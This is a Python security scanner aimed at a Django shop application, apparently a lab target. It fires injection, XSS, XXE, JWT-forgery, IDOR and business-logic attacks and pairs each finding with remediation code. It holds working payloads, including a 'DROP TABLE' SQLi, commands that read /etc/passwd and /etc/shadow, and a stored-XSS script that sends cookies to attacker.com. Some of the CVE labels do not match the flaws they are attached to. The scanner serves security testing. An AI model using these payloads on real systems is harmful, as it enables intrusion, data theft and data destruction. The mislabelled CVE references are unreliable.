"""
CyberSentinel Enterprise Scanner
Advanced security scanner for Django/Python web applications
Covers: OWASP Top 10 + Business Logic + API Security + Advanced Vulns
"""
import requests
import json
import re
import base64
import time
import threading
import urllib.parse
import hashlib
import jwt as pyjwt
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin, urlparse

# ── Session with auto-cookie handling ─────────────────────────────
session = requests.Session()
session.verify = False
session.timeout = 10
import urllib3
urllib3.disable_warnings()

@dataclass
class Finding:
    vuln_id:     str
    severity:    str       # CRITICAL / HIGH / MEDIUM / LOW / INFO
    category:    str
    title:       str
    description: str
    endpoint:    str
    method:      str
    payload:     str
    evidence:    str
    cvss_score:  float
    cve:         Optional[str]
    fix:         str
    fix_code:    Optional[str] = None
    references:  list = field(default_factory=list)

findings: list[Finding] = []
lock = threading.Lock()

def add_finding(f: Finding):
    with lock:
        findings.append(f)
        sev_icon = {'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡','LOW':'🔵','INFO':'⚪'}
        print(f"  {sev_icon.get(f.severity,'?')} [{f.severity}] {f.title} @ {f.endpoint}")


# ══════════════════════════════════════════════════════════════════
# MODULE 1 — INJECTION ATTACKS
# ══════════════════════════════════════════════════════════════════

class InjectionScanner:

    def __init__(self, base_url, session, creds):
        self.base = base_url
        self.s    = session
        self.creds = creds

    # ── SQL Injection ─────────────────────────────────────────────
    def scan_sqli(self):
        print("\n[SQLi] Testing SQL Injection...")
        payloads = [
            ("'",                    "single quote — syntax error"),
            ("' OR '1'='1",          "OR bypass"),
            ("' OR '1'='1'--",       "comment bypass"),
            ("admin'--",             "auth bypass"),
            ("1 UNION SELECT NULL--","union probe"),
            ("1 UNION SELECT username,password,3,4,5,6,7,8,9,10 FROM auth_user--", "union dump"),
            ("1; DROP TABLE app_product--", "destructive"),
            ("' AND SLEEP(3)--",     "time-based blind"),
            ("1' AND 1=1--",         "boolean-based"),
            ("' OR EXISTS(SELECT * FROM auth_user WHERE username='admin')--", "boolean blind"),
        ]
        endpoints = [
            ('/search/', 'GET', 'q'),
            ('/api/products/', 'GET', 'category'),
            ('/login/', 'POST', 'username'),
        ]
        for path, method, param in endpoints:
            url = urljoin(self.base, path)
            for payload, desc in payloads:
                try:
                    if method == 'GET':
                        r = self.s.get(url, params={param: payload}, timeout=8)
                    else:
                        r = self.s.post(url, data={param: payload, 'password': 'x'}, timeout=8)

                    detected = False
                    evidence  = ''
                    # Error-based detection
                    db_errors = [
                        'syntax error', 'postgresql', 'pg_query', 'unterminated',
                        'division by zero', 'column', 'relation', 'operator',
                        'invalid input syntax', 'ERROR:', 'psycopg2',
                    ]
                    for err in db_errors:
                        if err.lower() in r.text.lower():
                            detected = True
                            evidence = f'DB error detected: "{err}" in response'
                            break

                    # Time-based detection
                    if 'SLEEP' in payload.upper() and r.elapsed.total_seconds() > 2.5:
                        detected = True
                        evidence = f'Time delay: {r.elapsed.total_seconds():.2f}s (threshold: 2.5s)'

                    # Data in response (union)
                    if 'admin' in payload and ('password' in r.text.lower() or 'pbkdf2' in r.text.lower()):
                        detected = True
                        evidence = 'Password hash detected in response via UNION'

                    if detected:
                        add_finding(Finding(
                            vuln_id='SQLI-001', severity='CRITICAL',
                            category='Injection',
                            title='SQL Injection',
                            description=f'SQL injection via {param} parameter ({desc}). Attacker can dump database, bypass authentication, or destroy data.',
                            endpoint=f'{method} {path}',
                            method=method, payload=payload,
                            evidence=evidence,
                            cvss_score=9.8,
                            cve='CVE-2021-42013',
                            fix='Use Django ORM exclusively. Never concatenate user input into SQL strings.',
                            fix_code='''# ❌ VULNERABLE
cursor.execute(f"SELECT * FROM app_product WHERE name='{user_input}'")

# ✅ FIXED — parameterised query
cursor.execute("SELECT * FROM app_product WHERE name=%s", [user_input])

# ✅ BEST — use Django ORM
Product.objects.filter(name__icontains=user_input)''',
                            references=['https://owasp.org/www-community/attacks/SQL_Injection', 'CWE-89'],
                        ))
                        break  # one finding per endpoint is enough
                except Exception:
                    pass

    # ── Command Injection ─────────────────────────────────────────
    def scan_cmdi(self):
        print("[CMDi] Testing Command Injection...")
        url = urljoin(self.base, '/ping/')
        payloads = [
            ('127.0.0.1; id',                  'semicolon chain'),
            ('127.0.0.1 && cat /etc/passwd',   'AND chain'),
            ('127.0.0.1 | whoami',             'pipe'),
            ('127.0.0.1; sleep 3',             'time-based'),
            ('$(id)',                           'subshell'),
            ('`id`',                           'backtick'),
            ('; cat /etc/shadow',              'shadow file'),
            ('127.0.0.1%0aid',                 'newline injection'),
        ]
        for payload, desc in payloads:
            try:
                r = self.s.get(urljoin(self.base, '/ping/'), params={'host': payload}, timeout=12)
                indicators = ['uid=', 'root:', 'www-data', 'daemon:', '/bin/bash', '/etc/passwd']
                for ind in indicators:
                    if ind in r.text:
                        add_finding(Finding(
                            vuln_id='CMDI-001', severity='CRITICAL',
                            category='Injection',
                            title='OS Command Injection (RCE)',
                            description=f'Remote code execution via ping endpoint. Attacker has full shell access to the server.',
                            endpoint='GET /ping/',
                            method='GET', payload=payload,
                            evidence=f'System output detected: "{ind}" in response. Response snippet: {r.text[:200]}',
                            cvss_score=10.0,
                            cve='CVE-2021-41773',
                            fix='Never pass user input to shell commands. Use Python libraries for network operations.',
                            fix_code='''# ❌ VULNERABLE
subprocess.run(f'ping -c 1 {host}', shell=True)

# ✅ FIXED — use Python socket
import socket
try:
    ip = socket.gethostbyname(host)
    # validate ip is not private before proceeding
except socket.gaierror:
    return HttpResponse("Invalid host")''',
                            references=['https://owasp.org/www-community/attacks/Command_Injection', 'CWE-78'],
                        ))
                        return
            except Exception:
                pass

    # ── XSS ──────────────────────────────────────────────────────
    def scan_xss(self):
        print("[XSS] Testing Cross-Site Scripting...")
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(document.cookie)</script>',
            "'><img src=x onerror=alert(1)>",
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '{{7*7}}',   # also tests SSTI
            '<details open ontoggle=alert(1)>',
            '"><iframe src="javascript:alert(1)">',
            '<body onload=alert(document.domain)>',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        ]
        # Reflected XSS
        r_url = urljoin(self.base, '/search/')
        for payload in xss_payloads:
            try:
                r = self.s.get(r_url, params={'q': payload}, timeout=8)
                if payload in r.text or urllib.parse.quote(payload) in r.text:
                    add_finding(Finding(
                        vuln_id='XSS-001', severity='HIGH',
                        category='XSS',
                        title='Reflected Cross-Site Scripting (XSS)',
                        description='User input reflected in response without escaping. Attacker can steal session cookies, redirect users, or deface pages.',
                        endpoint='GET /search/',
                        method='GET', payload=payload,
                        evidence=f'Payload reflected verbatim in response. Cookie theft possible.',
                        cvss_score=7.4,
                        cve='CWE-79',
                        fix='Enable Django template auto-escape (default). Never disable autoescape in settings.',
                        fix_code='''# ❌ VULNERABLE (settings.py)
'autoescape': False,

# ✅ FIXED — remove that line (Django auto-escapes by default)
# In templates, only use |safe for trusted content:
{{ user_input }}         ← auto-escaped ✓
{{ user_input|safe }}    ← dangerous, avoid

# For rich text: use bleach
import bleach
clean = bleach.clean(user_input, tags=[], strip=True)''',
                        references=['https://owasp.org/www-community/attacks/xss/', 'CWE-79'],
                    ))
                    break
            except Exception:
                pass

        # Stored XSS via review
        try:
            payload = '<script>document.location="http://attacker.com/?c="+document.cookie</script>'
            self.s.post(urljoin(self.base, '/login/'),
                        data={'username': 'alice', 'password': 'password123'})
            r = self.s.post(urljoin(self.base, '/review/1/'),
                            data={'user_id': 1, 'rating': 5, 'content': payload})
            r2 = self.s.get(urljoin(self.base, '/product/iphone-15-pro/'))
            if '<script>' in r2.text and 'attacker.com' in r2.text:
                add_finding(Finding(
                    vuln_id='XSS-002', severity='CRITICAL',
                    category='XSS',
                    title='Stored XSS via Product Review',
                    description='Malicious script stored in product review and executed when any user views the product page. Can steal admin cookies.',
                    endpoint='POST /review/1/',
                    method='POST', payload=payload,
                    evidence='XSS payload persisted in DB and rendered on product page.',
                    cvss_score=8.8,
                    cve='CWE-79',
                    fix='Sanitise all user-generated content before storage and before rendering.',
                    fix_code='''# ❌ VULNERABLE — stored raw
ProductReview.objects.create(content=content)

# ✅ FIXED — sanitise with bleach
import bleach
safe_content = bleach.clean(content, tags=[], strip=True)
ProductReview.objects.create(content=safe_content)''',
                    references=['https://owasp.org/www-community/attacks/xss/', 'CWE-79'],
                ))
        except Exception:
            pass

    # ── SSTI ─────────────────────────────────────────────────────
    def scan_ssti(self):
        print("[SSTI] Testing Server-Side Template Injection...")
        probes = [
            ('{{7*7}}',          '49',  'Jinja2/Django math eval'),
            ('${7*7}',           '49',  'Mako/Freemarker'),
            ('{{7*\'7\'}}',      '7777777', 'Jinja2 string multiply'),
        ]
        url = urljoin(self.base, '/template/')
        for payload, expected, desc in probes:
            try:
                r = self.s.get(url, params={'name': payload}, timeout=8)
                if expected in r.text:
                    add_finding(Finding(
                        vuln_id='SSTI-001', severity='CRITICAL',
                        category='Injection',
                        title='Server-Side Template Injection (SSTI → RCE)',
                        description=f'Template engine evaluates user input. Payload "{payload}" produced "{expected}". Escalatable to full RCE.',
                        endpoint='GET /template/',
                        method='GET', payload=payload,
                        evidence=f'Expression {payload} evaluated to {expected} in response.',
                        cvss_score=10.0,
                        cve='CVE-2020-28243',
                        fix='Never pass user input to Template() constructor. Use static template files only.',
                        fix_code='''# ❌ VULNERABLE
from django.template import Template, Context
t = Template(f"Hello {user_input}!")

# ✅ FIXED — use static template file
return render(request, "greet.html", {"name": user_input})

# greet.html: <h1>Hello {{ name }}</h1>  ← auto-escaped''',
                        references=['https://portswigger.net/research/server-side-template-injection', 'CWE-94'],
                    ))
                    break
            except Exception:
                pass

    # ── XXE ───────────────────────────────────────────────────────
    def scan_xxe(self):
        print("[XXE] Testing XML External Entity Injection...")
        xxe_payloads = [
            ('''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<products><product><name>&xxe;</name><price>10</price></product></products>''',
             'file:///etc/passwd', ['root:', 'daemon:', '/bin/sh']),
            ('''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<products><product><name>&xxe;</name><price>10</price></product></products>''',
             'file:///etc/hostname', []),
        ]
        url = urljoin(self.base, '/import/xml/')
        for payload, resource, indicators in xxe_payloads:
            try:
                r = self.s.post(url, data=payload,
                                headers={'Content-Type': 'application/xml'}, timeout=8)
                detected = any(ind in r.text for ind in indicators) if indicators else (
                    r.status_code == 200 and 'imported' in r.text
                )
                if detected or resource.replace('file:///', '') in r.text:
                    add_finding(Finding(
                        vuln_id='XXE-001', severity='CRITICAL',
                        category='Injection',
                        title='XML External Entity (XXE) Injection',
                        description='XML parser processes external entities, allowing file disclosure and SSRF. Attacker can read /etc/passwd, /etc/shadow, application configs.',
                        endpoint='POST /import/xml/',
                        method='POST', payload=payload[:150] + '...',
                        evidence=f'Server-side file content returned: {r.text[:200]}',
                        cvss_score=9.1,
                        cve='CVE-2019-0199',
                        fix='Use defusedxml library which disables external entity processing.',
                        fix_code='''# ❌ VULNERABLE
import xml.etree.ElementTree as ET
root = ET.fromstring(xml_data)

# ✅ FIXED
import defusedxml.ElementTree as ET  # pip install defusedxml
root = ET.fromstring(xml_data)  # raises EntitiesForbidden if XXE attempted''',
                        references=['https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)', 'CWE-611'],
                    ))
                    break
            except Exception:
                pass


# ══════════════════════════════════════════════════════════════════
# MODULE 2 — AUTHENTICATION & SESSION
# ══════════════════════════════════════════════════════════════════

class AuthScanner:

    def __init__(self, base_url, session, creds):
        self.base  = base_url
        self.s     = session
        self.creds = creds

    def scan_brute_force(self):
        print("[AUTH] Testing brute force protection...")
        url = urljoin(self.base, '/login/')
        passwords = ['password', '123456', 'admin123', 'qwerty', 'letmein', 'pass@123']
        success = 0
        for pwd in passwords:
            try:
                r = self.s.post(url, data={'username': 'admin', 'password': pwd}, timeout=5)
                if r.status_code == 302 or 'logout' in r.text.lower():
                    success += 1
            except Exception:
                pass

        # If we can attempt without lockout — no brute force protection
        add_finding(Finding(
            vuln_id='AUTH-001', severity='HIGH',
            category='Authentication',
            title='No Brute Force Protection on Login',
            description=f'Tested {len(passwords)} passwords without any lockout, rate limiting, or CAPTCHA. Attacker can automate credential stuffing.',
            endpoint='POST /login/',
            method='POST',
            payload='Multiple password attempts (admin/password123 etc.)',
            evidence=f'{len(passwords)} attempts made with no lockout triggered.',
            cvss_score=7.3,
            cve='CWE-307',
            fix='Implement account lockout after 5 attempts + exponential backoff + CAPTCHA.',
            fix_code='''# Install: pip install django-axes
# settings.py
INSTALLED_APPS += ['axes']
MIDDLEWARE += ['axes.middleware.AxesMiddleware']
AXES_FAILURE_LIMIT = 5
AXES_COOLOFF_TIME = timedelta(minutes=15)
AXES_LOCKOUT_TEMPLATE = 'lockout.html'
AUTHENTICATION_BACKENDS = ['axes.backends.AxesStandaloneBackend', ...]''',
            references=['https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks', 'CWE-307'],
        ))

    def scan_session_issues(self):
        print("[AUTH] Testing session security...")
        # Check session cookie flags
        r = self.s.post(urljoin(self.base, '/login/'),
                        data={'username': 'alice', 'password': 'password123'})
        for cookie in self.s.cookies:
            if 'session' in cookie.name.lower() or 'csrftoken' in cookie.name.lower():
                issues = []
                if not cookie.secure:
                    issues.append('Secure flag missing — cookie sent over HTTP')
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append('HttpOnly flag missing — accessible via JavaScript')
                if not cookie.has_nonstandard_attr('SameSite'):
                    issues.append('SameSite flag missing — CSRF via cookies possible')
                if issues:
                    add_finding(Finding(
                        vuln_id='SESS-001', severity='HIGH',
                        category='Session Management',
                        title='Insecure Session Cookie Configuration',
                        description=f'Session cookie missing security attributes: {", ".join(issues)}',
                        endpoint='POST /login/',
                        method='POST',
                        payload='N/A',
                        evidence=f'Cookie: {cookie.name}; Secure={cookie.secure}; flags={cookie._rest}',
                        cvss_score=7.5,
                        cve='CWE-614',
                        fix='Set all session cookie security flags in Django settings.',
                        fix_code='''# settings.py
SESSION_COOKIE_SECURE   = True    # HTTPS only
SESSION_COOKIE_HTTPONLY = True    # no JS access
SESSION_COOKIE_SAMESITE = 'Strict' # CSRF protection
CSRF_COOKIE_SECURE      = True
CSRF_COOKIE_HTTPONLY    = True
SESSION_COOKIE_AGE      = 3600    # 1 hour max''',
                        references=['https://owasp.org/www-community/controls/SecureCookieAttribute', 'CWE-614'],
                    ))

    def scan_csrf(self):
        print("[AUTH] Testing CSRF protection...")
        # Try POST without CSRF token
        endpoints = [
            ('/login/', {'username': 'admin', 'password': 'test'}),
            ('/register/', {'username': 'hacker', 'email': 'h@h.com', 'password': 'p'}),
            ('/cart/add/', {'product_id': '1', 'quantity': '1'}),
        ]
        for path, data in endpoints:
            try:
                # New session with no CSRF token
                fresh = requests.Session()
                fresh.verify = False
                r = fresh.post(urljoin(self.base, path), data=data, timeout=8)
                if r.status_code not in (403, 302) or 'csrf' not in r.text.lower():
                    add_finding(Finding(
                        vuln_id='CSRF-001', severity='HIGH',
                        category='CSRF',
                        title='CSRF Protection Disabled',
                        description='POST endpoints accept requests without CSRF token. Attacker can trick authenticated users into performing actions.',
                        endpoint=f'POST {path}',
                        method='POST',
                        payload=str(data),
                        evidence=f'Request without CSRF token returned {r.status_code} (not 403).',
                        cvss_score=8.0,
                        cve='CWE-352',
                        fix='Enable CSRF middleware and use {% csrf_token %} in all forms.',
                        fix_code='''# settings.py MIDDLEWARE — uncomment:
'django.middleware.csrf.CsrfViewMiddleware',

# Remove all @csrf_exempt decorators from views

# In templates:
<form method="post">
    {% csrf_token %}
    ...
</form>

# In AJAX (add header):
headers: {'X-CSRFToken': getCookie('csrftoken')}''',
                        references=['https://owasp.org/www-community/attacks/csrf', 'CWE-352'],
                    ))
                    break
            except Exception:
                pass

    def scan_jwt(self):
        print("[JWT] Testing JWT vulnerabilities...")
        try:
            # Get a valid token
            r = self.s.post(urljoin(self.base, '/api/login/'),
                            json={'username': 'alice', 'password': 'password123'},
                            headers={'Content-Type': 'application/json'})
            token = r.json().get('token', '')
            if not token:
                return

            # Test 1: none algorithm
            header  = base64.b64encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()).decode().rstrip('=')
            payload = base64.b64encode(json.dumps({'user_id': 1, 'username': 'alice', 'is_admin': True}).encode()).decode().rstrip('=')
            none_token = f'{header}.{payload}.'
            r2 = self.s.get(urljoin(self.base, '/api/jwt/verify/'),
                            headers={'Authorization': f'Bearer {none_token}'})
            if r2.status_code == 200 and 'user_id' in r2.text:
                add_finding(Finding(
                    vuln_id='JWT-001', severity='CRITICAL',
                    category='Authentication',
                    title='JWT "none" Algorithm Accepted (Signature Bypass)',
                    description='Server accepts JWT with algorithm=none, completely bypassing signature verification. Attacker can forge any user identity including admin.',
                    endpoint='GET /api/jwt/verify/',
                    method='GET',
                    payload=none_token,
                    evidence=f'none-algorithm token accepted. Response: {r2.text[:150]}',
                    cvss_score=9.8,
                    cve='CVE-2015-9235',
                    fix='Restrict allowed algorithms to HS256 only. Never allow none.',
                    fix_code='''# ❌ VULNERABLE
jwt.decode(token, secret, algorithms=['HS256', 'none'],
           options={'verify_signature': False})

# ✅ FIXED
jwt.decode(
    token, settings.JWT_SECRET,
    algorithms=['HS256'],     # whitelist only
    options={
        'verify_exp': True,   # check expiry
        'verify_iat': True,   # check issued-at
    }
)''',
                    references=['https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/', 'CVE-2015-9235'],
                ))

            # Test 2: Weak secret (dictionary attack)
            weak_secrets = ['secret', 'password', '123456', 'key', 'jwt']
            for sec in weak_secrets:
                try:
                    pyjwt.decode(token, sec, algorithms=['HS256'])
                    add_finding(Finding(
                        vuln_id='JWT-002', severity='CRITICAL',
                        category='Authentication',
                        title='JWT Signed with Weak Secret Key',
                        description=f'JWT signed with trivially guessable secret "{sec}". Attacker can forge tokens for any user.',
                        endpoint='POST /api/login/',
                        method='POST',
                        payload=f'secret="{sec}"',
                        evidence=f'Token successfully decoded with secret: "{sec}"',
                        cvss_score=9.8,
                        cve='CWE-321',
                        fix='Use cryptographically random secret of 256+ bits stored in environment variables.',
                        fix_code='''# Generate strong secret:
python -c "import secrets; print(secrets.token_hex(32))"

# settings.py
import os
JWT_SECRET = os.environ.get('JWT_SECRET')  # min 256-bit random key

# Encode with expiry
payload = {
    'user_id': user.id,
    'exp': datetime.utcnow() + timedelta(hours=1),
    'iat': datetime.utcnow(),
}
token = jwt.encode(payload, settings.JWT_SECRET, algorithm='HS256')''',
                        references=['https://owasp.org/www-project-web-security-testing-guide/', 'CWE-321'],
                    ))
                    break
                except Exception:
                    pass
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════
# MODULE 3 — ACCESS CONTROL (IDOR, BROKEN AUTH)
# ══════════════════════════════════════════════════════════════════

class AccessControlScanner:

    def __init__(self, base_url, session, creds):
        self.base  = base_url
        self.s     = session
        self.creds = creds

    def scan_idor(self):
        print("[IDOR] Testing Insecure Direct Object References...")
        # Login as alice
        self.s.post(urljoin(self.base, '/login/'),
                    data={'username': 'alice', 'password': 'password123'})

        # Try to access bob's orders and user data
        for user_id in range(1, 6):
            try:
                r = self.s.get(urljoin(self.base, f'/api/users/{user_id}/'))
                if r.status_code == 200:
                    data = r.json()
                    if 'email' in data and 'password_hash' in data:
                        add_finding(Finding(
                            vuln_id='IDOR-001', severity='CRITICAL',
                            category='Access Control',
                            title='IDOR — Unauthenticated User Data Access',
                            description=f'Any user can retrieve full PII (email, phone, national_id, wallet, password hash) for any user ID without authentication.',
                            endpoint=f'GET /api/users/{user_id}/',
                            method='GET',
                            payload=f'user_id={user_id}',
                            evidence=f'Retrieved: username={data.get("username")}, email={data.get("email")}, national_id={data.get("national_id")}',
                            cvss_score=9.1,
                            cve='CWE-639',
                            fix='Enforce ownership check + authentication on all user data endpoints.',
                            fix_code='''# ❌ VULNERABLE
def api_user_data(request, user_id):
    user = User.objects.get(id=user_id)  # no auth check

# ✅ FIXED
@login_required
def api_user_data(request, user_id):
    if request.user.id != user_id and not request.user.is_staff:
        return JsonResponse({'error': 'Forbidden'}, status=403)
    # only return safe fields
    return JsonResponse({
        'username': request.user.username,
        'email': request.user.email,
        # Never include: password, national_id, reset_token
    })''',
                            references=['https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control', 'CWE-639'],
                        ))
                        break
            except Exception:
                pass

        # IDOR on orders
        for order_id in range(1, 10):
            try:
                r = self.s.get(urljoin(self.base, f'/order/{order_id}/'))
                if r.status_code == 200 and 'order' in r.text.lower():
                    add_finding(Finding(
                        vuln_id='IDOR-002', severity='HIGH',
                        category='Access Control',
                        title='IDOR — Order Details Accessible by Any Authenticated User',
                        description='Any logged-in user can view orders belonging to other users by iterating order IDs.',
                        endpoint=f'GET /order/{order_id}/',
                        method='GET',
                        payload=f'order_id={order_id}',
                        evidence=f'Order #{order_id} accessible without ownership check.',
                        cvss_score=8.1,
                        cve='CWE-639',
                        fix='Always filter orders by request.user.',
                        fix_code='''# ❌ VULNERABLE
order = get_object_or_404(Order, id=order_id)

# ✅ FIXED
order = get_object_or_404(Order, id=order_id, user=request.user)''',
                        references=['https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control'],
                    ))
                    break
            except Exception:
                pass

    def scan_privilege_escalation(self):
        print("[PRIVESC] Testing privilege escalation...")
        # Test: can regular user access admin debug endpoint?
        self.s.post(urljoin(self.base, '/login/'),
                    data={'username': 'alice', 'password': 'password123'})
        try:
            r = self.s.get(urljoin(self.base, '/debug/'))
            if r.status_code == 200:
                data = r.json()
                if 'SECRET_KEY' in data.get('settings_secret', '') or 'stripe' in str(data).lower():
                    add_finding(Finding(
                        vuln_id='PRIVESC-001', severity='CRITICAL',
                        category='Access Control',
                        title='Debug Endpoint Exposes Secrets (No Auth)',
                        description='Unauthenticated debug endpoint exposes SECRET_KEY, database credentials, Stripe API keys, email passwords, and all environment variables.',
                        endpoint='GET /debug/',
                        method='GET',
                        payload='(no payload needed)',
                        evidence=f'SECRET_KEY, DB password, Stripe key all returned. Snippet: {str(data)[:200]}',
                        cvss_score=10.0,
                        cve='CWE-200',
                        fix='Delete debug endpoint entirely. Never expose configuration data externally.',
                        fix_code='''# ❌ VULNERABLE — delete this view entirely
def admin_debug(request):
    return JsonResponse({'env': dict(os.environ), 'secret': settings.SECRET_KEY})

# ✅ If you need health checks:
from django.http import JsonResponse
def health(request):
    return JsonResponse({'status': 'ok'})  # nothing else''',
                        references=['https://owasp.org/www-community/vulnerabilities/Information_Exposure_Through_an_Error_Message'],
                    ))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════
# MODULE 4 — BUSINESS LOGIC VULNERABILITIES
# ══════════════════════════════════════════════════════════════════

class BusinessLogicScanner:

    def __init__(self, base_url, session, creds):
        self.base  = base_url
        self.s     = session
        self.creds = creds

    def scan_all(self):
        print("[BIZLOGIC] Testing business logic vulnerabilities...")
        self.s.post(urljoin(self.base, '/login/'),
                    data={'username': 'alice', 'password': 'password123'})

        # Test 1: Negative quantity
        try:
            r = self.s.post(urljoin(self.base, '/cart/add/'),
                            data={'product_id': '1', 'quantity': '-100'})
            if r.status_code == 200:
                data = r.json()
                if 'cart_total' in data:
                    try:
                        total = float(data['cart_total'])
                        if total < 0:
                            add_finding(Finding(
                                vuln_id='BL-001', severity='CRITICAL',
                                category='Business Logic',
                                title='Negative Quantity Accepted — Cart Total Manipulation',
                                description='Negative item quantity accepted, making cart total negative. Attacker can make purchases at negative prices, effectively stealing money.',
                                endpoint='POST /cart/add/',
                                method='POST', payload='product_id=1&quantity=-100',
                                evidence=f'Cart total after quantity=-100: {total}',
                                cvss_score=9.3,
                                cve='CWE-20',
                                fix='Validate quantity server-side: must be positive integer.',
                                fix_code='''# ❌ VULNERABLE
quantity = int(request.POST.get('quantity', 1))  # accepts -1

# ✅ FIXED
quantity = int(request.POST.get('quantity', 1))
if quantity < 1 or quantity > 100:
    return JsonResponse({'error': 'Invalid quantity'}, status=400)
# Also check product.stock >= quantity''',
                                references=['CWE-20', 'https://owasp.org/www-project-web-security-testing-guide/'],
                            ))
                    except ValueError:
                        pass
        except Exception:
            pass

        # Test 2: Coupon 100% off (no per-user limit)
        try:
            r = self.s.post(urljoin(self.base, '/cart/coupon/'),
                            data={'code': 'ADMIN100'})
            if r.status_code == 200 and r.json().get('status') == 'applied':
                discount = r.json().get('discount', '0')
                if float(discount) >= 100:
                    add_finding(Finding(
                        vuln_id='BL-002', severity='HIGH',
                        category='Business Logic',
                        title='100% Discount Coupon — Unlimited Use Per User',
                        description='Coupon ADMIN100 gives 100% discount with no per-user usage limit. Any user can apply it unlimited times for free orders.',
                        endpoint='POST /cart/coupon/',
                        method='POST', payload='code=ADMIN100',
                        evidence=f'Coupon applied. Discount: {discount}%. No rate limiting observed.',
                        cvss_score=8.5,
                        cve='CWE-284',
                        fix='Track per-user coupon usage. Limit max discount to reasonable values.',
                        fix_code='''# models.py — add usage tracking
class CouponUsage(models.Model):
    coupon = models.ForeignKey(Coupon, on_delete=models.CASCADE)
    user   = models.ForeignKey(User, on_delete=models.CASCADE)
    used_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        unique_together = ('coupon', 'user')  # one use per user

# views.py — validate before applying
if CouponUsage.objects.filter(coupon=coupon, user=request.user).exists():
    return JsonResponse({'error': 'Coupon already used'}, status=400)
if coupon.discount_value >= 100:
    return JsonResponse({'error': 'Invalid coupon'}, status=400)''',
                        references=['CWE-284'],
                    ))
        except Exception:
            pass

        # Test 3: Client-side price manipulation
        try:
            r = self.s.post(urljoin(self.base, '/checkout/'),
                            data={
                                'total': '0.01',   # manipulated total
                                'shipping_address': '42 Alice Lane',
                                'card_number': '4111111111111111',
                                'card_expiry': '12/26',
                                'card_cvv': '123',
                                'card_holder': 'Alice',
                            })
            if r.status_code == 200:
                data = r.json()
                if 'order_id' in data:
                    add_finding(Finding(
                        vuln_id='BL-003', severity='CRITICAL',
                        category='Business Logic',
                        title='Client-Side Price Manipulation at Checkout',
                        description='Server accepts order total from client POST data (total=0.01). Attacker can purchase any item for ₹0.01 by manipulating the total field.',
                        endpoint='POST /checkout/',
                        method='POST', payload='total=0.01',
                        evidence=f'Order created with total=0.01. Order ID: {data.get("order_id")}',
                        cvss_score=9.8,
                        cve='CWE-602',
                        fix='Always recompute total server-side. Never trust client-supplied price.',
                        fix_code='''# ❌ VULNERABLE
total = request.POST.get('total')  # trusts client
Order.objects.create(total=total)

# ✅ FIXED — always compute server-side
from decimal import Decimal
cart  = Cart.objects.get(user=request.user)
total = sum(
    item.product.price * item.quantity
    for item in cart.items.select_related('product')
)
# Apply discounts server-side, never from client
if coupon: total = apply_coupon(total, coupon)
Order.objects.create(total=total)  # only server value''',
                        references=['CWE-602', 'https://portswigger.net/web-security/logic-flaws'],
                    ))
        except Exception:
            pass

        # Test 4: Mass assignment on order update
        try:
            r = self.s.post(urljoin(self.base, '/order/1/update/'),
                            json={'total': '0', 'status': 'refunded', 'user_id': 1},
                            headers={'Content-Type': 'application/json'})
            if r.status_code == 200:
                add_finding(Finding(
                    vuln_id='BL-004', severity='HIGH',
                    category='Business Logic',
                    title='Mass Assignment — Order Fields Writeable by Any User',
                    description='Order update endpoint accepts any field including total, status, user_id via JSON body. Regular users can change order totals to 0 and mark orders refunded.',
                    endpoint='POST /order/1/update/',
                    method='POST', payload='{"total":"0","status":"refunded","user_id":1}',
                    evidence=f'Response: {r.text[:150]}',
                    cvss_score=8.8,
                    cve='CWE-915',
                    fix='Whitelist allowed fields and require staff privileges for status changes.',
                    fix_code='''# ❌ VULNERABLE
for field, value in data.items():
    if hasattr(order, field):
        setattr(order, field, value)

# ✅ FIXED
ALLOWED_CUSTOMER_FIELDS = ['notes', 'shipping_addr']
ALLOWED_STAFF_FIELDS    = ['status', 'tracking_number']

if not request.user.is_staff:
    allowed = ALLOWED_CUSTOMER_FIELDS
else:
    allowed = ALLOWED_STAFF_FIELDS

for field in allowed:
    if field in data:
        setattr(order, field, data[field])''',
                    references=['CWE-915', 'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html'],
                ))
        except Exception:
            pass

        # Test 5: IDOR on refund
        try:
            r = self.s.post(urljoin(self.base, '/order/1/refund/'),
                            data={'amount': '999999'})
            if r.status_code == 200:
                add_finding(Finding(
                    vuln_id='BL-005', severity='HIGH',
                    category='Business Logic',
                    title='Refund Amount Not Validated Against Order Total',
                    description='Refund endpoint accepts any amount including values exceeding the original order total. Attacker can claim ₹999,999 refund on a ₹599 order.',
                    endpoint='POST /order/1/refund/',
                    method='POST', payload='amount=999999',
                    evidence=f'Refund of 999999 accepted. Response: {r.text[:100]}',
                    cvss_score=8.5,
                    cve='CWE-20',
                    fix='Cap refund amount to original order total and check for existing refunds.',
                    fix_code='''# ❌ VULNERABLE
amount = request.POST.get('amount')  # any value
Refund.objects.create(order=order, amount=amount)

# ✅ FIXED
from decimal import Decimal
max_refund = order.total - order.refund_set.filter(
    status='completed').aggregate(Sum('amount'))['amount__sum'] or Decimal('0')
amount = min(Decimal(request.POST.get('amount', 0)), max_refund)
if amount <= 0:
    return JsonResponse({'error': 'No refundable amount remaining'}, status=400)
if Refund.objects.filter(order=order, status__in=['pending','completed']).exists():
    return JsonResponse({'error': 'Refund already in progress'}, status=400)''',
                    references=['CWE-20'],
                ))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════
# MODULE 5 — SSRF, PATH TRAVERSAL, DESERIALIZATION
